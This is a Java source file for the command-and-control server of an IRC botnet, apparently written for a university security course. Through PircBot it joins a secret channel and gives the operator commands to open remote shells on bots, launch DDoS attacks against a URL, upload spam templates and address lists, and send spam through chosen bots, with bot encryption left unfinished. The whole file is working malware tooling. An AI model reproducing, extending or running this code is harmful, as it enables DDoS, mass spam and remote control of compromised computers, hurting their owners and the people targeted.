import java.io.*;
import java.net.*;
import java.security.AlgorithmParameterGenerator;
import java.security.AlgorithmParameters;
import java.security.Key;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.util.*;

import javax.crypto.Cipher;
import javax.crypto.spec.DHParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.mail.*;
import org.jibble.pircbot.*;

/**
 * This is the BotnetServer class, it serve as the command and control interface for the bot master.
 * There are several commands available to the user including
 * <dl>
 * 		<dt>Help</dt>
 * 			<dd> Prints out the available commands <br/>
 * 				Usage: help
 * 			</dd>
 * 		<dt>Names</dt>
 * 			<dd> Prints out the nicks of all bots running on the IRC server <br/>
 * 				Usage: names
 * 			</dd>
 * 		<dt>Remote shell</dt>
 * 			<dd> One must give the command "exit" to leave the shell again, if you must type "exit" but don't wish to leave simply append a space <br/>
 * 				Usage: shell botNick [timeout]
 * 			</dd>
 * 		<dt>Distributed Denial of Service</dt>
 * 			<dd> One can specify by nick and number of bots to have participate or simply say "all" for the first bot nick to have all bots participate  <br/>
 * 				Usage: ddos url interval duration bot [more bots]
 * 			</dd>
 * 		<dt>Spam File Upload</dt>
 * 			<dd> One can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names "template.txt" or "emails.txt".
 * 				 You can specify specific bots to send the files to or you can give 'all' to send the file to all available bots. 
 * 				The template file must contain unique 'XXX', 
 * 				'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line. <br/>
 * 				Usage: spamupload templateFile emailFile bot [more bots]
 * 			</dd>
 * 		<dt>Spam</dt>
 * 			<dd> One can send spam with the XXX, YYY, and ZZZ fields (must be wrapped in single quotes in command) in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word. 
 * 				The spam will be sent from the given address to the given recipients.
 * 				Giving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to
 * 				a random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, 
 * 				the number will not be respected if it exceeds the size of the botnet.
 * 				Usage: spam numBots 'xxx' 'yyy' 'zzz' 'subject' recipient [more recipients]
 * 			</dd>
 * 		<dt>Kill</dt>
 * 			<dd> One can specify a list of bot nicks or just say all. This command simply stops the bot process, 
 * 				but it will start again when the user restarts his/her machine.
 * 				Usage: kill bot [more bots]
 * 			</dd>
 * 		<dt>Eradicate</dt>
 * 			<dd> One can specify a list of bot nicks or just say all. The eradicate command kills the bot 
 * 				process and runs the cleaning script provided.
 * 				Usage: eradicate cleanURL bot [more bots]
 * 			</dd>
 * </dl>
 * 
 * @author Roy McElmurry, Robert Johnson
 */
public class BotnetServer extends PircBot {
	private static final String[] COMMANDS = {"help", "names", "list", "shell", "ddos", "spam", "lease", "killbot", "destroybotnet"};
	
	private static final String SENTINEL = "$: ";
	private static final String TERMINATION = "exit";
	private static final String SERVER = "eve.cs.washington.edu";
	private static final String CHANNEL = "#hacktastic";
	private static final String NAME = "RandR";
	private static final boolean DEBUG = true;
	private static final int PORT = 6667;
	private static final int TIMEOUT = 120000;
	private Scanner input;
	private boolean inChat;
	private Map<String, MsgEncrypt> botKeys;
	
	private PubInfo info;
		
	public static void main(String[] args) {
		BotnetServer bn = new BotnetServer();
	}
	
	/**
	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
	 */
	public BotnetServer() {
		input = new Scanner(System.in);
		try {
			botKeys = new HashMap<String, MsgEncrypt>();
			//masterKey = MsgEncrypt.getStartKey();
			//masterKey = new SecretKeySpec(key, "DESede");
			//masterCipher = Cipher.getInstance("AES");
			//masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
			//masterMsgE = MsgEncrypt.getInstance(masterKey);
			
			setVerbose(DEBUG);
			setName(NAME);
			setMessageDelay(0);
			
			connect(SERVER, PORT);
			
			input = new Scanner(System.in);
		} catch (NickAlreadyInUseException e) {
			changeNick(NAME);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	// TODO: put this into the MsgEncrypt object as a static method
	/*protected Key genCCBotKey() throws Exception {
		AlgorithmParameterGenerator paramGen = AlgorithmParameterGenerator.getInstance("DH");
		paramGen.init(1024);
		AlgorithmParameters params = paramGen.generateParameters();

		DHParameterSpec dhSpec = (DHParameterSpec)params.getParameterSpec(DHParameterSpec.class);

		KeyPairGenerator keyGen = KeyPairGenerator.getInstance("DH");
		
		keyGen.initialize(dhSpec);
		
		KeyPair aKeyPair = keyGen.generateKeyPair();
		KeyPair bKeyPair = keyGen.generateKeyPair();
		
		// This give the public keys...
		Key aPubKey = aKeyPair.getPublic();
		Key bPubKey = bKeyPair.getPublic();
		
		MsgEncrypt msgE = MsgEncrypt.getInstance(aKeyPair, bPubKey);
		MsgEncrypt m2 = MsgEncrypt.getInstance(bKeyPair, aPubKey);
		Key privKey = msgE.getPrivateKey();
		return privKey;
	}*/
	
	protected void onConnect() {
		joinChannel(CHANNEL);
		setMode(CHANNEL, "s");
	}
	
	protected void onUserList(String channel, User[] bots) {
		for (int i = 0; i < bots.length; i++) {
			if (!bots[i].getNick().equals(NAME)) {
				System.out.println("\t" + bots[i].toString());
				//TODO: fill in stuff with key stuff
				PubInfo info = MsgEncrypt.getPubParams();
				MsgEncrypt m = MsgEncrypt.getInstance();
				m.setPubParams(info.toString());
				String stuff = "key " + m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::") + " " + info.toString();
				//System.out.println(stuff.length() + " " + stuff.replace("\\", "\\\\").split("\n").length);
				//System.out.println(Arrays.toString(stuff.split("\n")));
				//String stuff2 = "";
				//for (String s : stuff.split("\n")) {
				//	stuff2 += s + " blah ";
				//} 
				//System.out.println("\n\n:" + stuff2 + ":\n\n");
				//sendMessage(bots[i].getNick(), stuff2);
				sendMessage(bots[i].getNick(), stuff);
				botKeys.put(bots[i].getNick(), m);
			}
		}
		init();
	}
	
	protected void onChannelInfo(String channel, int userCount, String topic) {
		System.out.println("\t" + channel + " (" + userCount + ")");
	}
	
	protected void onMessage(String channel, String sender, String login, String hostname, String message) {
		System.out.println("<" + sender + ">: " + message);
	}
	
	protected void onPrivateMessage(String sender, String login, String hostname, String message) {
		if (message.toLowerCase().startsWith("key")) {
			String[] parts = message.split(" ", 2);
			if (!botKeys.containsKey(sender) && parts.length > 1) {
				//botKeys.put(sender, new MsgEncrypt(parts[1]);
				MsgEncrypt m = botKeys.get(sender);
				m.handShake(parts[1]);
				botKeys.put(sender, m);
			}
		}
	}
	
	protected void onFileTransferFinished(DccFileTransfer transfer, Exception e) {
		if (e != null) {
			System.out.println("\tThere was a problem trasferring the file\n\t" + e.getMessage());
		} else {
			String fileName = transfer.getFile().getName();
			System.out.println("\tSuccessfully delivered " + fileName + " to " + transfer.getNick());
		}
	}
	
	/**
	 * Reads input from the user and handles the command.
	 */
	public void init() {
		System.out.print("Command: ");
		String message = input.nextLine();
		while(!message.toLowerCase().equalsIgnoreCase("q")) {
			try {
				performCommand(message);
				System.out.print("Command: ");
				message = input.nextLine();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	/** 
	 * <p>If s is a recognized command, the corresponding action is taken, 
	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
	 * and finally if it is not a command or a private message to the channel then it is sent 
	 * as a raw message the IRC server.</p>
	 * 
	 * @param s A command/message to be interpreted
	 */
	public void performCommand(String s) throws Exception {
		//Respond to a help command with a shit ton of printlns.
		if (s.toLowerCase().equalsIgnoreCase("help")) {
			printHelp();
		//Respond to a list command by listing all channels (DOESN'T WORK)
		} else if (s.toLowerCase().equalsIgnoreCase("listpeeps")) {
			listChannels();
		//Respond to a names command by getting the user on CHANNEL and printing their nicks
		} else if (s.toLowerCase().equals("names")) {
			String[] bots = getUserNames();
			for (String name : bots) {
				System.out.println("\t" + name);
			}
		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
			acquireOpStatus();
		//Respond to the shell command by sending commands to the specified bot and reading responses until the chat has ended
		} else if (s.toLowerCase().startsWith("shell")) {
			String[] parts = s.split(" ");
			if (parts.length >= 3) {
				engageInChat(parts[1], Integer.parseInt(parts[2]));
			} else if (parts.length >= 2) {
				engageInChat(parts[1], TIMEOUT);
			} else {
				System.out.println("\tUsage: shell botNick [timeout]");
			}
		//Respond to a ddos command by gathering the arguments and private messaging each specified bot
		} else if (s.toLowerCase().startsWith("ddos")) {
			String[] parts = s.split(" ");
			if (parts.length < 5) {
				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
			} else {
				String[] botNames = chooseBots(parts, 4);
				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
				for (String name : botNames) {
					if (!name.equals(NAME)) {
						// TODO: encrypt command
						this.sendMessage(name, command);
						//this.sendMessage(name, masterMsgE.encryptMsg(command));
					}
				}
			}
		//Respond to a spam command by sending over the spam template file and emails file and then initiating a spam attack
		} else if (s.toLowerCase().startsWith("spamupload")) {
			String[] parts = s.split(" ");
			if (parts.length < 4) {
				System.out.println("Usage: spamupload template emails bot [more bots]");
			} else {
				String[] botNames = chooseBots(parts, 3);
				for (String name : botNames) {
					if (!name.equals(NAME)) {
						dccSendFile(new File(parts[1]), name, TIMEOUT);
						dccSendFile(new File(parts[2]), name, TIMEOUT);
					}
				}
			}
		//Respond to spam command by selecting numbots bots and issuing the command	
		} else if (s.toLowerCase().startsWith("spam")) {
			try {
				String[] peices = s.split("'");
				String[] firstArgs = peices[0].trim().split(" ");
				String[] lastArgs = peices[8].split(" ");
				lastArgs = Arrays.copyOfRange(lastArgs, 1, lastArgs.length);
				
				List<String> list = new ArrayList<String>();
				for (String arg : firstArgs) {
					list.add(arg);
				}
				list.add("'" + peices[1] + "'");
				list.add("'" + peices[3] + "'");
				list.add("'" + peices[5] + "'");
				list.add("'" + peices[7] + "'");
				for (String arg : lastArgs) {
					list.add(arg);
				}
				
				String[] parts = list.toArray(new String[0]);
				
				if (parts.length < 7) {
					System.out.println(list);
					System.out.println(Arrays.toString(parts));
					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
				} else {
					String[] bots = getUserNames();
					if (!parts[1].equalsIgnoreCase("all")) {
						int numBots = Integer.parseInt(parts[1]);
						if (bots.length > numBots) {
							bots = Arrays.copyOfRange(bots, 0, numBots + 1);
						}
					}
					String command = parts[0];
					for (int i = 2; i < parts.length; i++) {
						command += " " + parts[i];
					}
					for (String name : bots) {
						// TODO: encrypt command
						sendMessage(name, command);
						//sendMessage(name, masterMsgE.encryptMsg(command));
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
				System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
			}
		//Respond to a kill command by sending it to the bots
		} else if (s.toLowerCase().startsWith("kill")) {
			String[] parts = s.split(" ");
			String[] bots = chooseBots(parts, 1);
			for (String name : bots) {
				sendMessage(name, parts[0]);
			}
		//Respond to an eradicate command by sending it along with the clean script url to each bot
		} else if (s.toLowerCase().startsWith("eradicate")) {
			String[] parts = s.split(" ");
			String[] bots = chooseBots(parts, 2);
			for (String name : bots) {
				sendMessage(name, parts[0] + " " + parts[1]);
			}
		//Respond to a message beginning with a colon by messaging the CHANNEL
		} else if (s.startsWith(":")) {
			// TODO: encrypt s.substring
			String[] bots = getUserNames();
			for (String name : bots) {
				sendMessage(name, s.substring(1));
			}
			//sendMessage(CHANNEL, masterMsgE.encryptMsg(s.substring(1)));
		//Respond to all other messages by sending the message raw to the IRC server
		} else if (!s.isEmpty()) {
			// TODO: encrypt s
			sendRawLine(s);
			//sendRawLine(masterMsgE.encryptMsg(s));
		}
	}
	
	public String[] chooseBots(String[] arr, int index) {
		if (arr[index].equalsIgnoreCase("all")) {
			return getUserNames();
		} else {
			return Arrays.copyOfRange(arr, index, arr.length);
		}
	}
	
	public String[] getUserNames() {
		User[] bots = getUsers(CHANNEL);
		List<String> namesList = new ArrayList<String>();
		for (User bot : bots) {
			if (!bot.getNick().equalsIgnoreCase(NAME)) {
				namesList.add(bot.getNick());
			}
		}
		return namesList.toArray(new String[0]);
	}
	
	/**
	 * Gives the CC bot operator status and then removes it from all other bots.
	 */
	private void acquireOpStatus() {
		op(CHANNEL, NAME);
		User[] bots = getUsers(CHANNEL);
		for (int i = 0; i < bots.length; i++) {
			System.out.println(bots[i].getNick());
			if (!bots[i].getNick().equals(NAME)) {
				deOp(CHANNEL, bots[i].toString());
			}
		}
		op(CHANNEL, NAME);
	}
	
	/**
	 * Prints out a help message that describes available functionality and commands.
	 */
	private void printHelp() {
		System.out.println("\tHelp");
		System.out.println("\t\tPrints out the available commands");
		System.out.println("\t\tUsage: help");
		System.out.println("\tNames");
		System.out.println("\t\tPrints out the nicks of all bots running on the IRC server");
		System.out.println("\t\tUsage: names");
		System.out.println("\tRemote shell");
		System.out.println("\t\tOne must give the command \"exit\" to leave the shell again, if you must type \"exit\" but don't wish to leave simply append a space");
		System.out.println("\t\tUsage: shell botNick [timeout]");
		System.out.println("\tDistributed Denial of Service");
		System.out.println("\t\tOne can specify by nick and number of bots to have participate or simply say \"all\" for the first bot nick to have all bots participate");
		System.out.println("\t\tddos url interval duration bot [more bots]");
		System.out.println("\tSpam File Upload");
		System.out.println("\t\tOne can upload a template and email file with this command for later use in sending spam. The uploaded files must have the names \"template.txt\" or \"emails.txt\".");
		System.out.println("\t\tYou can specify specific bots to send the files to or you can give 'all' to send the file to all available bots.");
		System.out.println("\t\tThe template file must contain unique 'XXX', ");
		System.out.println("\t\t'YYY' and 'ZZZ' strings somewhere in it. The emails file must be non-empty and contain exactly one email per line.");
		System.out.println("\t\tUsage: spamupload templateFile emailFile bot [more bots]");
		System.out.println("\tSpam");
		System.out.println("\t\tOne can send spam with the XXX, YYY, and ZZZ fields in the template file replaced with the arguments given. These arguments may not contain spaces, they must be one word."); 
		System.out.println("\t\tThe spam will be sent from the given address to the given recipients.");
		System.out.println("\t\tGiving all as an argument for 'recipient' will send a spam email to everyone in the emails file and giving 'random' will send a spam email to");
		System.out.println("\t\ta random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, ");
		System.out.println("\t\tthe number will not be respected if it exceeds the size of the botnet.");
		System.out.println("\t\tUsage: spam numBots xxx yyy zzz subject recipient [more recipients]");
	}
	
	/**
	 * Establishes a DCC chat with the specified bot for the purpose of creating a remote shell.
	 * Feeds commands to the bot and prints out responses.
	 */
	private void engageInChat(String botNick, int timeout) {
		DccChat chat = dccSendChatRequest(botNick, timeout);
		if (chat == null) {
			System.out.println("The chat request was rejected.");
		} else {
			Scanner input = new Scanner(System.in);
			Scanner shellout = new Scanner(chat.getBufferedReader());
			
			try {
				// TODO: decrypt this
				System.out.print(shellout.nextLine());
				//String msg = shellout.nextLine();
				//System.out.println(msg);
				//System.out.println(masterMsgE.decryptMsg(msg));
				
				String command = input.nextLine();
				while (!command.equalsIgnoreCase(TERMINATION)) {
					// TODO: make this encrypted
					//chat.sendLine(masterMsgE.encryptMsg(command)); // Made this encrypted
					chat.sendLine(command);
					// TODO: decrypt this
					String response = shellout.nextLine();
					//String response = masterMsgE.decryptMsg(shellout.nextLine());
					while (!response.endsWith(SENTINEL)) {
						System.out.println("\t" + response);
						// TODO: decrypt this
						response = shellout.nextLine();
						//response = masterMsgE.decryptMsg(shellout.nextLine());
					}
					System.out.print(response);
					command = input.nextLine();
				}
				chat.sendLine(command);
				//chat.sendLine(masterMsgE.encryptMsg(command));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
